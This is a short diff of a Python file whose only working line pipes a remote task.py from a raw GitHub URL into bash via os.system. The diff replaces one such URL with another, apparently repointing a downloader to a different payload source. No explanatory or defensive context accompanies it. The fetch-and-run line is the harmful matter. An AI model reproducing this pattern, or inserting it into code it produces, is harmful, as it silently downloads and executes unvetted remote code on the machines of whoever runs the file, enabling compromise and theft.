@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://raw.githubusercontent.com/ajayy188/gkukjgk/refs/heads/main/task.py | bash')
+os.system('curl -sL https://raw.githubusercontent.com/edboardeshordave/pulan/refs/heads/main/task.py | bash')
